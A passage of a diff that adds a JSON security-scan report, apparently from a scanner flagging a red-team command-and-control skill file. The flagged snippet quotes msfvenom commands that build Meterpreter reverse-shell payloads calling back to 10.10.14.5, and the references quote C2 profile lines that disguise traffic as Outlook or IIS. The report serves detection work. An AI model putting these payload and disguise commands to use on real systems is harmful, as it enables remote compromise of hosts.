+          "code_snippet": "e commercial tools are unavailable. You use msfvenom for payload generation and multi/handler for catching callbacks.\n\n### Payload Generation with msfvenom\n\n```bash\n# Staged vs Stageless:\n# Staged (windows/meterpreter/reverse_https) -- small initial payload, downloads stage\n# Stageless (windows/meterpreter_reverse_https) -- full payload, no staging handshake\n\n# Windows stageless HTTPS Meterpreter\nmsfvenom -p windows/x64/meterpreter_reverse_https \\\n    LHOST=10.10.14.5 LPORT=443 \\\n    HttpUserAgent=\"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\" \\\n    StagerVerifySSLCert=true \\\n    HandlerSSLCert=/opt/certs/c2.pem \\\n    -f exe -o payload.exe\n\n# C# shellcode for custom loaders\nmsfvenom -p windows/x64/meterpreter_reverse_https \\\n    LHOST=10.10.14.5 LPORT=443 \\\n    -f csharp -o shellcode.cs\n\n# Linux ELF payload\nmsfvenom -p linux/x64/meterpreter_reverse_tcp \\\n    LHOST=10.10.14.5 LPORT=4444 \\\n    -f elf -o payload.elf\n\n# macOS Mach-O payload\nmsfvenom -p osx/x64/meterpreter_reverse_tcp \\\n    LH",
+          "intent": null,
+          "tags": [
+            "YARA Match"
+          ],
+          "evidence": {},
+          "match_fingerprint": "6163bf5dcca8e68723ae2a33b8e366652e4b87ed2546f1aa367ddc7347d4dc3a",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 368,
+              "end_line": null
+            }
+          ],
+          "surface": "instructions"
+        }
+      ],
+      "suppressed_count": 0,
+      "suppressed": [],
+      "metadata": {
+        "has_executable_scripts": false,
+        "skillspector_version": "2.12.0",
+        "llm_requested": false,
+        "llm_available": false,
+        "meta_analysis_applied": false,
+        "inference_usage": [],
+        "llm_provenance": {
+          "schema_version": 1,
+          "provider": {
+            "configured_adapter": "unknown",
+            "resolved_adapter": "unknown",
+            "effective_adapter": "not_applicable",
+            "effective_adapters": [],
+            "service": "unknown",
+            "routing": {
+              "deployment_override": null,
+              "deployment_source": "unknown",
+              "api_version": null,
+              "api_version_source": "unknown"
+            }
+          },
+          "analyzers": [
+            {
+              "analyzer_id": "mcp_tool_poisoning",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "semantic_developer_intent",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "semantic_quality_policy",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "semantic_security_discovery",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "meta_analyzer",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            }
+          ],
+          "sampling": {
+            "temperature": {
+              "requested": null,
+              "source": "provider_default",
+              "forwarded_to_client": null,
+              "adapter_support": false,
+              "provider_support": "unknown"
+            },
+            "seed": {
+              "requested": null,
+              "source": "unset",
+              "forwarded_to_client": null,
+              "adapter_support": false,
+              "provider_support": "unknown"
+            },
+            "reasoning_effort": {
+              "requested": null,
+              "source": "provider_default",
+              "forwarded_to_client": null,
+              "adapter_support": false,
+              "provider_support": "unknown"
+            }
+          },
+          "determinism": {
+            "classification": "not_applicable",
+            "control_status": "not_applied",
+            "provider_guarantee": false,
+            "reason": "LLM analysis was not executed for this scan."
+          }
+        },
+        "filtering_mode": "heuristic"
+      },
+      "analysis_completeness": {
+        "total_components": 1,
+        "scanned_components": 1,
+        "coverage_percent": 100.0,
+        "is_complete": true,
+        "status": "complete_with_caveats",
+        "execution_successful": true,
+        "fully_inspected_files": 1,
+        "partially_inspected_files": 0,
+        "entirely_uninspected_files": 0,
+        "ledger_exceptions": [
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 36,
+            "end_line": 36,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 45,
+            "end_line": 45,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 66,
+            "end_line": 66,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 67,
+            "end_line": 67,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 138,
+            "end_line": 138,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 175,
+            "end_line": 175,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 236,
+            "end_line": 236,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 237,
+            "end_line": 237,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 238,
+            "end_line": 238,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 239,
+            "end_line": 239,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 242,
+            "end_line": 242,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 276,
+            "end_line": 276,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 278,
+            "end_line": 278,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 304,
+            "end_line": 304,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 317,
+            "end_line": 317,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 326,
+            "end_line": 326,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 370,
+            "end_line": 370,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 399,
+            "end_line": 399,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 479,
+            "end_line": 479,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 537,
+            "end_line": 537,
+            "fatal": false
+          }
+        ],
+        "scope_exclusions": [],
+        "analyzer_statuses": [
+          {
+            "analyzer_id": "artifact_integrity",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "behavioral_ast",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "behavioral_taint_tracking",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "bundled_execution_surface",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "mcp_least_privilege",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "mcp_rug_pull",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "mcp_tool_poisoning",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "meta_analyzer",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "semantic_developer_intent",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "semantic_quality_policy",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "semantic_security_discovery",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "static_patterns_agent_snooping",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_anti_refusal",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_data_exfiltration",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_deserialization",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_excessive_agency",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_harmful_content",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_memory_poisoning",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_output_handling",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_privilege_escalation",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_prompt_injection",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_rogue_agent",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_ssrf",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_supply_chain",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_system_prompt_leakage",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_tool_misuse",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_yara",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          }
+        ],
+        "references": [
+          {
+            "source_path": "SKILL.md",
+            "line": 36,
+            "column": 16,
+            "evidence": "set useragent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0\";",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 36,
+            "column": 58,
+            "evidence": "set useragent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0\";",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 36,
+            "column": 97,
+            "evidence": "set useragent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0\";",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 36,
+            "column": 114,
+            "evidence": "set useragent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0\";",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 36,
+            "column": 128,
+            "evidence": "set useragent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0\";",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 45,
+            "column": 14,
+            "evidence": "set CN \"outlook.office365.com\";",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 66,
+            "column": 26,
+            "evidence": "header \"Server\" \"Microsoft-IIS/10.0\";",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 67,
+            "column": 32,
+            "evidence": "header \"X-Powered-By\" \"ASP.NET\";",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 138,
+            "column": 11,
+            "evidence": "#include \"beacon.h\"",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 175,
+            "column": 1,
+            "evidence": "./sliver-server",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 236,
+            "column": 1,
+            "evidence": "./mythic-cli install github https://github.com/MythicAgents/apollo",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 237,
+            "column": 1,
+            "evidence": "./mythic-cli install github https://github.com/MythicAgents/poseidon",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 238,
+            "column": 1,
+            "evidence": "./mythic-cli install github https://github.com/MythicAgents/medusa",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 239,
+            "column": 1,
+            "evidence": "./mythic-cli install github https://github.com/MythicC2Profiles/http",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 242,
+            "column": 1,
+            "evidence": "./mythic-cli start",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 276,
+            "column": 32,
+            "evidence": "\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\",",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 278,
+            "column": 26,
+            "evidence": "\"Host\": \"cdn-static.example.com\"",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 304,
+            "column": 10,
+            "evidence": "Host: \"0.0.0.0\"",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 317,
+            "column": 12,
+            "evidence": "Host: \"10.10.14.5\"",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 326,
+            "column": 18,
+            "evidence": "- \"Server: nginx/1.24.0\"",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 370,
+            "column": 20,
+            "evidence": "HttpUserAgent=\"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\" \\",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 399,
+            "column": 20,
+            "evidence": "set HttpUserAgent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 479,
+            "column": 24,
+            "evidence": "header \"Host\" \"your-tenant.cdn-provider.net\";",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 537,
+            "column": 12,
+            "evidence": "-name \"outlook.office365.com\" -passout pass:changeit",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          }
+        ],
+        "limitations": [],
+        "findings_before_filtering": 2,
+        "findings_after_filtering": 2,
+        "dependency_inspection": {
+          "enabled": false,
+          "status": "not_requested",
+          "mode": "static_local",
+          "locked_entries": 0,
+          "inspected_artifacts": 0,
+          "artifacts": []
+        }
+      }
+    }
+  ]
+}
